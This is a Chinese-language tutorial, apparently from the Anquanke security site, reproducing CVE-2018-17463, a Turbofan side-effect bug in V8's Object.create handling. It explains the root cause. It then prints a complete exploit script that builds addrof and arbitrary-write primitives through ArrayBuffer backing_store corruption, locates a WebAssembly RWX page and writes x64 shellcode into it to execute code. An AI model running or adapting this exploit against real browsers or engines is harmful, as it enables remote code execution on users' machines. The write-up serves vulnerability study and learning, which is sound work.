@@ -1,0 +1,836 @@
+# 通过一个CVE零基础入门V8-pwn
+
+阅读量 **550331**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-11-05 16:30:03
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p4.ssl.qhimg.com/t014de6c53a1d4f4db8.jpg)
+
+## 前言
+
+跟随P4nda大佬的博客：<http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/#Reference>  
+复现了CVE-2018-17463，在一些大佬懒得讲的地方加了一些理解和解释，比较新手向
+
+## 环境
+
+**commit:** 568979f4d891bafec875fab20f608ff9392f4f29  
+ **v8环境搭建：**<https://zhuanlan.zhihu.com/p/159646912>
+
+## 正文
+
+漏洞存在于src/compiler/js-operator.cc:625
+
+    
+    
+    #define CACHED_OP_LIST(V)                                              
+    ... ...
+      V(CreateObject, Operator::kNoWrite, 1, 1)                            
+    ... ...
+    
+
+问题是对JSCreateObject的操作存在误判，V8认为CreateObject不存在副作用,所以是kNoWrite，副作用就是指某个操作改变了某些全局变量或其他的系统状态等等。
+
+但是实际上，在Turbofan的generic-lowering阶段，generic-lowering作用是将JS前缀指令转换为更简单的调用和stub调用。Turbofan把JSCreateObject节点用Builtins函数kCreateObjectWithoutProperties代替，而kCreateObjectWithoutProperties就是一个stub调用。
+
+（这里一些源码就不放了，新手向新手向，想细看源码的可以移步大佬的博客）
+
+如果一路跟进下去，在JSObject::NormalizeProperties函数中，可以发现该函数会调用Map::Normalize根据原有的map生成一个新的map，并且利用新的map重新构建输入的Object，这明显是一个具有side-effect的操作。  
+也就是说这个函数会改变我们传进去的参数object。然后看这句代码：
+
+![](https://p0.ssl.qhimg.com/t01db57c4f22c6ecea1.png)
+
+可以看到，新生成的map是字典模式的。所以最后我们输入的object即便原来是fast模式，也会变成字典模式。所以JSCreate并不是KNoWrite的。
+
+KNoWrite是一个枚举类型的标志：
+
+![](https://p1.ssl.qhimg.com/t01d1387de25f03ef78.png)
+
+那么我们如何实现JSCreate操作呢，这里可以通过Object.create触发  
+其函数定义为：
+
+`Object.create(proto, [propertiesObject])`  
+第二个参数是可选的，如果写了就会把它加入到新创建的对象的可枚举属性中。然后第一个参数是作为新创建的对象的原型，这也就满足了上面说的一个对象作为另一个对象的原型的条件。
+
+接下来我们用d8去调一下试试：  
+首先我们声明一个对象：
+
+![](https://p0.ssl.qhimg.com/t01fc55418084b684c5.png)
+
+可以看到此时a是fast模式，然后我们执行Object.create(a)试试：
+
+![](https://p0.ssl.qhimg.com/t0117c80ac5b3a0fecd.png)
+
+可以看到，我们只是将a当做一个参数去调用了一个函数，a本身的模式就被改变了。
+
+现在我们只知道a的模式被改变了，那么对应到具体的内存中又发生了哪些变化呢，我们用gdb调进去看看：
+
+先放调试的js代码：
+
+    
+    
+    var a={x:1,y:2,z:3};
+    a.b=4;
+    a.c=5;
+    a.d=6;
+    %DebugPrint(a);
+    %SystemBreak();
+    Object.create(a);
+    %DebugPrint(a);
+    %SystemBreak();
+    
+
+我们首先来到第一个断点：
+
+![](https://p4.ssl.qhimg.com/t010bb2854c54c83c52.png)
+
+这是a的结构，有六个属性，其中有三个标志为properties，还有三个我们可以通过查看object的map：
+
+![](https://p0.ssl.qhimg.com/t01c53a4c7463395eca.png)
+
+发现是inobject properties，也就是保存在结构体内部的属性。  
+我们可以直接查看a所在的内存：
+
+![](https://p4.ssl.qhimg.com/t01508e4422f66ba4ef.png)
+
+可以发现，第一个八字节，存的是object对应的map，第二个八字节：
+
+![](https://p1.ssl.qhimg.com/t016ef813c4bf38ea07.png)
+
+可以看到里面存放了我们后来添加进去的三个属性，并且是按顺序存储。  
+然后我们看进入到第二个断点处：
+
+![](https://p5.ssl.qhimg.com/t0183884fe54680ce07.png)
+
+可以看到a的map已经变成了字典模式，符合我们上面对它进行的分析。  
+然后我们查看a的内存：
+
+![](https://p3.ssl.qhimg.com/t01bd32af2a8ffeecd9.png)
+
+我们发现x,y,z的属性值不见了，我们再去查看properties：
+
+![](https://p1.ssl.qhimg.com/t014dbbe34e1d96fbc2.png)
+
+发现长度变成了6，并且结构变成了hashtable，也就是哈希表。  
+到了这里，我们发现，Object.create对一个Object的影响，无论原来的属性是inobject
+properties还是properties，都搞到properties中，并且把原来的线性结构改成hash表的字典结构。
+
+现在我们已经知道了这个side-effect，那么我们如何利用它呢？  
+首先我们看一个函数：
+
+    
+    
+    function foo(o) { return o.a + o.b; }
+    
+
+其IR code 如下：
+
+    
+    
+    CheckHeapObject o 
+    CheckMap o, map1 
+    r0 = Load [o + 0x18] 
+    CheckHeapObject o 
+    CheckMap o, map1 
+    r1 = Load [o + 0x20] 
+    r2 = Add r0, r1 
+    CheckNoOverflow 
+    Return r2
+    
+
+大意就是检查map，赋值，检查map，赋值，相加，检查溢出，返回
+
+当两个检查节点中间的操作是kNoWrite时，第二个检查就变成了多余的，所以我们可以先访问一个对象的内部属性，然后调用Object.create(),由于JS引擎默认这个操作是kNoWrite的，所以可能会导致我们再访问变量的时候不检查了。具体利用方法为：
+
+首先定义一个数组，初始化一个a属性，然后再额外添加一个b属性，然后利用Object.create(数组),改变其内部存储，然后返回b属性。
+
+    
+    
+    function attack()
+    {
+        function change(x)
+        {
+            x.a;
+            Object.create(x);
+            return x.b;
+        }
+    
+        for(let i =0;i<10000;i++)
+        {
+            let x={a:0x1234};
+            x.b=0x5678;
+            let res=change(x);
+            if(res!=0x5678)
+            {
+                console.log(i);
+                console.log("CVE-2018-17463 exists in the d8");
+                return;
+            }
+        }
+        console.log("no cve")
+    }
+    attack()
+    
+
+把这段代码扔d8里跑一下：
+
+![](https://p1.ssl.qhimg.com/t0141adc33cc69c2b8f.png)
+
+可以看到确实触发了漏洞
+
+由于它是由顺序表变成了哈希表，具有一定的随机性，每个属性的偏移位置是不固定的，这给我们的稳定利用带来了难度，但是我们又发现了一个规律：
+
+![](https://p2.ssl.qhimg.com/t01d4264ec498d1950c.png)
+
+![](https://p4.ssl.qhimg.com/t018e5299643f5681ad.png)
+
+当我们对两个属性名相同的对象进行上面的操作时，相同的属性名所在的偏移是相同的，尽管他们的属性值不同。
+
+接下来就到了比较难懂的地方了，我们抓住相同的属性名偏移相同这一特点，以及V8会有一定可能因为认为Object.create的操作是kNoWrite的而放弃第二次检查这两个特点，去构造一个冲突，什么冲突呢，属性名偏移冲突。
+
+我们先来看代码：
+
+    
+    
+    let OPTIMIZATION_NUM = 10000
+    let OBJ_LEN  = 0x30
+    
+    function getOBJ(){
+        let res = {a:0x1234};
+        for (let i = 0; i< OBJ_LEN;i++){
+            eval(`res.${'b'+i} = -${0x4869 + i};
+            `);        
+        }
+        return res;
+    }
+    
+    function findCollision(){
+        let find_obj = [];
+        for (let i = 0;i<OBJ_LEN;i++){
+            find_obj[i] = 'b'+i;
+        }
+        eval(`
+            function bad_create(x){
+                x.a;
+                this.Object.create(x);
+                ${find_obj.map((b) => `let ${b} = x.${b};`).join('\n')}
+                return [${find_obj.join(', ')}];
+            }
+        `);
+        for (let i = 0; i<OPTIMIZATION_NUM;i++){
+            let tmp = bad_create(getOBJ());
+            for (let j = 0 ;j<tmp.length;j++){
+                if(tmp[j] != -(j+0x4869) && tmp[j] < -0x4868 && tmp[j] > -(1+OBJ_LEN +0x4869) ){
+                    console.log('b'+ j +' & b' + -(tmp[j]+0x4869) +" are collision in directory");
+                    //return ['b'+j , 'b' + -(tmp[j]+0x4869)];
+                }
+            }
+        }
+        throw "not found collision ";
+    }
+    findCollision();
+    
+
+由于本人是刚学V8两天的小白，仅仅这段代码就看了足足一个小时，还好最后也是看懂了，这里来讲讲它做了什么：
+
+可以这样理解，我们先搞出来一个对象，赋一些属性上去，这里注意，一定要是有规律的赋，怎么算有规律呢，我们需要能够做到通过属性名知道属性值，并且能够通过属性值知道属性名，这里可以采用字母+编号的方式。比如b12=120；b13=121;b14=122这种方式，让其对应上。
+
+做以上操作的时候代码中运用了模板字符串啊，eval等这些函数，以前也没怎么接触过js，确实是蒙了一小会，不过多百度百度也就懂了。
+
+然后仿照上面我们判断引擎是否存在cve漏洞的方法，通过判断返回值是否符合预期我们就可以知道是否触发了漏洞，然后这里多了一个操作，如果不符合预期的话，那它应该是给我们返回了一个其他属性的值，什么值呢，这里就需要依靠之前设定的规律来找到，找到发生冲突的属性，假设是我们预期的返回值是A的，但是返回了B的属性值，说明漏洞发生了，数据内存结构被改变了。也就是说当我访问B的时候，它会给我B的属性值，当我访问A的时候，它还会给我B的属性值。
+
+为什么这样就可以利用了呢？
+
+我们上面已经发现了，相同的属性名，偏移不变，所以如果我们新建一个object，然后添加两个属性，名字就叫A和B，此时我去访问A，就可以得到B的数据了，如果B中存了object类型的数据，那么我正常通过B去访问，引擎检测到我要打印object的话，它会显示类型名，即object，如果A中本来存了浮点型的数据，这样打印的时候，会把对应偏移的数据当成浮点型来打印，也就是会打印真值，而对应偏移的数据其实是B的object的地址，这样就拿到了addrof原语。  
+我们来看一下实现代码：
+
+    
+    
+    o.X = {x1:1.1,x2:1.2}; o.Y = {y1:obj};
+    
+    
+    
+    function bad_create(o){ o.a; this.Object.create(o); return o.X.x1;}
+    
+
+这样的话看似返回的应该是1.1，但是实际上返回的是浮点型的object的地址，我们做一下浮点转换即可。
+
+有了addrof原语，我们还需要能够做到任意地址读写，这里借用了ArrayBuffer这一数据结构。我们先来看一下ArrayBuffer的结构长啥样：
+
+    
+    
+    pwndbg> v8print 0x1d4b8ef8e1a9
+    0x1d4b8ef8e1a9: [JSArrayBuffer] 
+    - map: 0x350743c04371 <Map(HOLEY_ELEMENTS)> [FastProperties] 
+    - prototype: 0x29b14b610fd1 <Object map = 0x350743c043c1>
+    - elements: 0x236c6c482cf1 <FixedArray[0]> [HOLEY_ELEMENTS] 
+    - embedder fields: 2 
+    - backing_store: 0x5652a87208f0 
+    - byte_length: 1024 
+    - neuterable 
+    - properties: 0x236c6c482cf1 <FixedArray[0]> {}
+    - embedder fields = {    
+    (nil)    
+    (nil) 
+    }
+    
+
+其长度由byte_length指定，而实际读写的内存位于backing_store，当可以修改一个ArrayBuffer的backing_store时就可以对任意地址进行读写。而此成员在结构体中的偏移是0x20
+
+也就是说我们需要构造一个往偏移+0x20处写的操作就可以控制ArrayBuffer读写哪里的内存。
+
+然后我们来研究一下fast模式下的内存结构，我们先看这段代码执行的结果：
+
+    
+    
+    var a={x0:0x41414141};
+    %DebugPrint(a);
+    %SystemBreak();
+    
+
+![](https://p4.ssl.qhimg.com/t01620935af38912005.png)
+
+可以看到第一个属性值出现在了偏移为0x18的位置  
+那么如果换成这种嵌套的写法呢：
+
+    
+    
+    var a={x0:{x1:1.1,x2:1.2}};
+    %DebugPrint(a);
+    %SystemBreak();
+    
+
+我们再来看一下：
+
+![](https://p1.ssl.qhimg.com/t0108e9c7bd50020edb.png)
+
+我们会发现，0x18存的是0x20处的地址，然后0x20是一个新的对象的起始地址，然后1.2存在了0x20偏移0x20的地方，那么结合之前的漏洞，我们可以知道，当我们去修改X.x0.x2的时候，就是在修改Y.object偏移0x20位置的值了。
+
+也就是说我们有了任意写了，那么如何任意读呢，由于我们是利用ArrayBuffer来进行的任意地址写，读肯定也要借助它，这里用了DataView:
+
+![](https://p0.ssl.qhimg.com/t019231e31dcff30c51.png)
+
+它可以方便的读取ArrayBuffer里的数据。
+
+最后一个问题，我们有了任意地址读写，我们应该考虑的是往一个rwx的区域写shellcode，然后去执行，我们往哪里写呢？  
+利用的是wasm机制，这里给出一个wasm的实例构造：
+
+    
+    
+    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
+    var wasmImports = {
+      env: {
+        puts: function puts (index) {
+          console.log(utf8ToString(h, index));
+        }
+      }
+    };
+    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
+    let h = new Uint8Array(m.exports.memory.buffer);
+    let f = m.exports.p4nda;
+    f();
+    
+
+其中，f是一个JSFunction对象，只不过其实际执行代码存放于一个rwx的内存中，通过写该内存的代码区域，最终调用f()，触发来执行shellcode。
+
+首先，构造wasm对象f方便shellcode执行，并利用addrof原语泄露f的地址。然后，定义一个ArrayBuffer对象，并利用gc机制使其被放入Old
+Space使地址更加稳定。之后，不断的利用该ArrayBuffer对象，泄露并修改其backing_store成员指向待读写区域，具体修改顺序为从JSFucntion到rwx区域的寻址流程：
+
+`JSFucntion -(0x18)->SharedFunctionInfo -(0x8)-> WasmExportedFunctionData
+-(0x10)-> WasmInstanceObject -(0xc8)-> imported_function_targets -(0)->
+rwx_area`
+
+我们通过一串调用链一路读下去，读到一个，写到ArrayBuffer的backing_store中，然后接着读指定偏移的数据，再写过去，一直做到我们得到rwx地址，然后往rwx里面写好shellcode，最后调用f()触发即可。
+
+有关wasm机制可以通过这篇文章进行一个初步的了解：<https://www.cnblogs.com/jixiaohua/p/10425805.html>
+
+到这里所有的攻击原理已经了解清楚了，这里放一下大佬的exp，我这小垃圾自己写肯定是写不来的了，不过至少大佬的exp已经基本弄懂了。
+
+    
+    
+    function gc()
+    {
+        /*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/
+        for(var i=0;i<((1024 * 1024)/0x10);i++)
+        {
+            var a= new String();
+        }
+    }
+    function give_me_a_clean_newspace()
+    {
+        /*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/
+        gc()
+        gc()
+    }
+    let f64 = new Float64Array(1);
+    let u32 = new Uint32Array(f64.buffer);
+    function d2u(v) {
+        f64[0] = v;
+        return u32;
+    }
+    function u2d(lo, hi) {
+        u32[0] = lo;
+        u32[1] = hi;
+        return f64;
+    }
+    function hex(b) {
+        return ('0' + b.toString(16)).substr(-2);
+    }
+    // Return the hexadecimal representation of the given byte array.
+    function hexlify(bytes) {
+        var res = [];
+        for (var i = 0; i < bytes.length; i++)
+            res.push(hex(bytes[i]));
+        return res.join('');
+    }
+    // Return the binary data represented by the given hexdecimal string.
+    function unhexlify(hexstr) {
+        if (hexstr.length % 2 == 1)
+            throw new TypeError("Invalid hex string");
+        var bytes = new Uint8Array(hexstr.length / 2);
+        for (var i = 0; i < hexstr.length; i += 2)
+            bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
+        return bytes;
+    }
+    function hexdump(data) {
+        if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
+            data = Array.from(data);
+        var lines = [];
+        for (var i = 0; i < data.length; i += 16) {
+            var chunk = data.slice(i, i+16);
+            var parts = chunk.map(hex);
+            if (parts.length > 8)
+                parts.splice(8, 0, ' ');
+            lines.push(parts.join(' '));
+        }
+        return lines.join('\n');
+    }
+    // Simplified version of the similarly named python module.
+    var Struct = (function() {
+        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
+        var buffer      = new ArrayBuffer(8);
+        var byteView    = new Uint8Array(buffer);
+        var uint32View  = new Uint32Array(buffer);
+        var float64View = new Float64Array(buffer);
+        return {
+            pack: function(type, value) {
+                var view = type;        // See below
+                view[0] = value;
+                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
+            },
+            unpack: function(type, bytes) {
+                if (bytes.length !== type.BYTES_PER_ELEMENT)
+                    throw Error("Invalid bytearray");
+                var view = type;        // See below
+                byteView.set(bytes);
+                return view[0];
+            },
+            // Available types.
+            int8:    byteView,
+            int32:   uint32View,
+            float64: float64View
+        };
+    })();
+    //
+    // Tiny module that provides big (64bit) integers.
+    //
+    // Copyright (c) 2016 Samuel Groß
+    //
+    // Requires utils.js
+    //
+    // Datatype to represent 64-bit integers.
+    //
+    // Internally, the integer is stored as a Uint8Array in little endian byte order.
+    function Int64(v) {
+        // The underlying byte array.
+        var bytes = new Uint8Array(8);
+        switch (typeof v) {
+            case 'number':
+                v = '0x' + Math.floor(v).toString(16);
+            case 'string':
+                if (v.startsWith('0x'))
+                    v = v.substr(2);
+                if (v.length % 2 == 1)
+                    v = '0' + v;
+                var bigEndian = unhexlify(v, 8);
+                bytes.set(Array.from(bigEndian).reverse());
+                break;
+            case 'object':
+                if (v instanceof Int64) {
+                    bytes.set(v.bytes());
+                } else {
+                    if (v.length != 8)
+                        throw TypeError("Array must have excactly 8 elements.");
+                    bytes.set(v);
+                }
+                break;
+            case 'undefined':
+                break;
+            default:
+                throw TypeError("Int64 constructor requires an argument.");
+        }
+        // Return a double whith the same underlying bit representation.
+        this.asDouble = function() {
+            // Check for NaN
+            if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
+                throw new RangeError("Integer can not be represented by a double");
+            return Struct.unpack(Struct.float64, bytes);
+        };
+        // Return a javascript value with the same underlying bit representation.
+        // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
+        // due to double conversion constraints.
+        this.asJSValue = function() {
+            if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
+                throw new RangeError("Integer can not be represented by a JSValue");
+            // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
+            this.assignSub(this, 0x1000000000000);
+            var res = Struct.unpack(Struct.float64, bytes);
+            this.assignAdd(this, 0x1000000000000);
+            return res;
+        };
+        // Return the underlying bytes of this number as array.
+        this.bytes = function() {
+            return Array.from(bytes);
+        };
+        // Return the byte at the given index.
+        this.byteAt = function(i) {
+            return bytes[i];
+        };
+        // Return the value of this number as unsigned hex string.
+        this.toString = function() {
+            return '0x' + hexlify(Array.from(bytes).reverse());
+        };
+        // Basic arithmetic.
+        // These functions assign the result of the computation to their 'this' object.
+        // Decorator for Int64 instance operations. Takes care
+        // of converting arguments to Int64 instances if required.
+        function operation(f, nargs) {
+            return function() {
+                if (arguments.length != nargs)
+                    throw Error("Not enough arguments for function " + f.name);
+                for (var i = 0; i < arguments.length; i++)
+                    if (!(arguments[i] instanceof Int64))
+                        arguments[i] = new Int64(arguments[i]);
+                return f.apply(this, arguments);
+            };
+        }
+        // this = -n (two's complement)
+        this.assignNeg = operation(function neg(n) {
+            for (var i = 0; i < 8; i++)
+                bytes[i] = ~n.byteAt(i);
+            return this.assignAdd(this, Int64.One);
+        }, 1);
+        // this = a + b
+        this.assignAdd = operation(function add(a, b) {
+            var carry = 0;
+            for (var i = 0; i < 8; i++) {
+                var cur = a.byteAt(i) + b.byteAt(i) + carry;
+                carry = cur > 0xff | 0;
+                bytes[i] = cur;
+            }
+            return this;
+        }, 2);
+        // this = a - b
+        this.assignSub = operation(function sub(a, b) {
+            var carry = 0;
+            for (var i = 0; i < 8; i++) {
+                var cur = a.byteAt(i) - b.byteAt(i) - carry;
+                carry = cur < 0 | 0;
+                bytes[i] = cur;
+            }
+            return this;
+        }, 2);
+    }
+    // Constructs a new Int64 instance with the same bit representation as the provided double.
+    Int64.fromDouble = function(d) {
+        var bytes = Struct.pack(Struct.float64, d);
+        return new Int64(bytes);
+    };
+    // Convenience functions. These allocate a new Int64 to hold the result.
+    // Return -n (two's complement)
+    function Neg(n) {
+        return (new Int64()).assignNeg(n);
+    }
+    // Return a + b
+    function Add(a, b) {
+        return (new Int64()).assignAdd(a, b);
+    }
+    // Return a - b
+    function Sub(a, b) {
+        return (new Int64()).assignSub(a, b);
+    }
+    // Some commonly used numbers.
+    Int64.Zero = new Int64(0);
+    Int64.One = new Int64(1);
+    function utf8ToString(h, p) {
+      let s = "";
+      for (i = p; h[i]; i++) {
+        s += String.fromCharCode(h[i]);
+      }
+      return s;
+    }
+    function log(x,y = ' '){
+        console.log("[+] log:", x,y);   
+    }
+    
+    let OPTIMIZATION_NUM = 10000;
+    let OBJ_LEN = 0x20;
+    let X;
+    let Y;
+    // use a obj to check whether CVE-2018-17463 exists
+    
+    function check_vul(){
+        function bad_create(x){
+            x.a;
+            Object.create(x);
+            return x.b;
+    
+        }
+    
+        for (let i = 0;i < OPTIMIZATION_NUM; i++){
+            let x = {a : 0x1234};
+            x.b = 0x5678; 
+            let res = bad_create(x);
+            //log(res);
+            if( res != 0x5678){
+                log("CVE-2018-17463 exists in the d8");
+                return;
+            }
+    
+        }
+        throw "bad d8 version";
+    
+    }
+    
+    
+    // check collision between directory mode and fast mode
+    
+    function getOBJ(){
+        let res = {a:0x1234};
+        for (let i = 0; i< OBJ_LEN;i++){
+            eval(`res.${'b'+i} = -${0x4869 + i};
+            `);        
+        }
+        return res;
+    }
+    function printOBJ(x){
+        for(let i = 0;i<OBJ_LEN;i++){
+            eval(`console.log("log:["+${i}+"] :"+x.${'b'+i})`);
+            //console.log('['+i+']'+x[i]);
+        }
+    }
+    function findCollision(){
+        let find_obj = [];
+        for (let i = 0;i<OBJ_LEN;i++){
+            find_obj[i] = 'b'+i;
+        }
+        eval(`
+            function bad_create(x){
+                x.a;
+                this.Object.create(x);
+                ${find_obj.map((b) => `let ${b} = x.${b};`).join('\n')}
+                return [${find_obj.join(', ')}];
+            }
+        `);
+        for (let i = 0; i<OPTIMIZATION_NUM;i++){
+            let tmp = bad_create(getOBJ());
+            for (let j = 0 ;j<tmp.length;j++){
+                if(tmp[j] != -(j+0x4869) && tmp[j] < -0x4868 && tmp[j] > -(1+OBJ_LEN +0x4869) ){
+                    log('b'+ j +' & b' + -(tmp[j]+0x4869) +" are collision in directory");
+                    return ['b'+j , 'b' + -(tmp[j]+0x4869)];
+                }
+            }
+        }
+        throw "not found collision ";
+    }
+    
+    // create primitive -> addrof
+    function getOBJ4addr(obj){
+        let res = {a:0x1234};
+        for (let i = 0; i< OBJ_LEN;i++){
+            if (('b'+i)!= X &&('b'+i)!= Y  ){
+            eval(`res.${'b'+i} = 1.1;
+            `);        }
+            if (('b'+i)== X){
+                eval(`
+                    res.${X} = {x1:1.1,x2:1.2};
+                    `);            
+            }
+            if (('b'+i)== Y){
+                eval(`
+                    res.${Y} = {y1:obj};
+                    `);            
+            }        
+        }
+        return res;
+    }
+    function addrof(obj){
+        eval(`
+            function bad_create(o){
+                o.a;
+                this.Object.create(o);
+                return o.${X}.x1;
+            }
+        `);
+    
+        for (let i = 0;i < OPTIMIZATION_NUM;i++){ 
+            let ret = bad_create( getOBJ4addr(obj));
+             let tmp =Int64.fromDouble(ret).toString();
+            if (ret!= 1.1){
+                log(tmp);
+                return ret; 
+            }
+        }
+        throw "not found addrof obj";
+    
+    }
+    
+    // create primitive -> Arbitrary write
+    function getOBJ4read(obj){
+        let res = {a:0x1234};
+        for (let i = 0; i< OBJ_LEN;i++){
+            if (('b'+i)!= X &&('b'+i)!= Y  ){
+            eval(`res.${'b'+i} = {};
+            `);        }
+            if (('b'+i)== X){
+                eval(`
+                    res.${X} = {x0:{x1:1.1,x2:1.2}};
+                    `);            
+            }
+            if (('b'+i)== Y){
+                eval(`
+                    res.${Y} = {y1:obj};
+                    `);            
+            }        
+        }
+        return res;
+    }
+    function arbitraryWrite(obj,addr){
+        eval(`
+            function bad_create(o,value){
+                o.a;
+                this.Object.create(o);
+                let ret = o.${X}.x0.x2;
+                 o.${X}.x0.x2 = value;
+                return ret;
+            }
+        `);
+    
+        for (let i = 0;i < OPTIMIZATION_NUM;i++){ 
+            let ret = bad_create( getOBJ4read(obj),addr);
+            let tmp =Int64.fromDouble(ret).toString();
+            if (ret!= 1.2){
+                return ;
+            }
+        }
+        throw "not found arbitraryWrite";
+    
+    }
+    
+    // exploit
+    
+    function exploit(){
+        var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
+        var wasmImports = {
+          env: {
+            puts: function puts (index) {
+              console.log(utf8ToString(h, index));
+            }
+          }
+        };
+        let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
+        let h = new Uint8Array(m.exports.memory.buffer);
+        let f = m.exports.p4nda;
+        console.log("step 0: Game start");
+        f();
+        console.log("step 1: check whether vulnerability exists");
+        check_vul();
+        console.log("step 2: find collision");
+        [X,Y] = findCollision();
+    
+        let mem = new ArrayBuffer(1024); 
+        give_me_a_clean_newspace();
+        console.log("step 3: get address of JSFunciton");
+        let addr = addrof(f);
+        console.log("step 4: make ArrayBuffer's backing_store -> JSFunciton");
+        arbitraryWrite(mem,addr);
+        let dv = new DataView(mem);
+        SharedFunctionInfo_addr = Int64.fromDouble(dv.getFloat64(0x17,true));
+        console.log("[+] SharedFunctionInfo addr :"+SharedFunctionInfo_addr);
+        console.log("step 5: make ArrayBuffer's backing_store ->  SharedFunctionInfo");
+        arbitraryWrite(mem,SharedFunctionInfo_addr.asDouble());
+        WasmExportedFunctionData_addr =  Int64.fromDouble(dv.getFloat64(0x7,true));
+        console.log("[+] WasmExportedFunctionData addr :"+WasmExportedFunctionData_addr);
+        console.log("step 6: make ArrayBuffer's backing_store ->  WasmExportedFunctionData");
+        arbitraryWrite(mem,WasmExportedFunctionData_addr.asDouble());
+        WasmInstanceObject_addr =  Int64.fromDouble(dv.getFloat64(0xf,true));
+        console.log("[+] WasmInstanceObject addr :"+WasmInstanceObject_addr);
+        console.log("step 7: make ArrayBuffer's backing_store ->  WasmInstanceObject");
+        arbitraryWrite(mem,WasmInstanceObject_addr.asDouble());
+        imported_function_targets_addr =  Int64.fromDouble(dv.getFloat64(0xc7,true));
+        console.log("[+] imported_function_targets addr :"+imported_function_targets_addr);
+        console.log("step 8: make ArrayBuffer's backing_store ->  imported_function_targets");
+        arbitraryWrite(mem,imported_function_targets_addr.asDouble());
+        code_addr =  Int64.fromDouble(dv.getFloat64(0,true));
+        console.log("[+] code addr :"+code_addr);
+        log("step 9: make ArrayBuffer's backing_store ->  rwx_area");
+        arbitraryWrite(mem,code_addr.asDouble());
+        console.log("step 10: write shellcode for poping up a calculator");
+        let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
+        let write_tmp = new Uint8Array(mem);
+        write_tmp.set(shellcode_calc);
+        console.log("[+] Press Any key to execute Shellcode");
+        readline();
+        f();
+    
+    }
+    
+    exploit();
+    
+
+然后我们来具体打一下看看效果：
+
+![](https://p4.ssl.qhimg.com/t01c3a9f2d787e38492.png)
+
+计算器确实被丢出来了，拜拜~
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Ayaka** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/255239](/post/id/255239)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Pwn](/tag/Pwn)
+  * [CTF](/tag/CTF)
+  * [v8](/tag/v8)
+
+ **+1** __14赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t0197bf74553dcf1cac.png) Ayaka
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
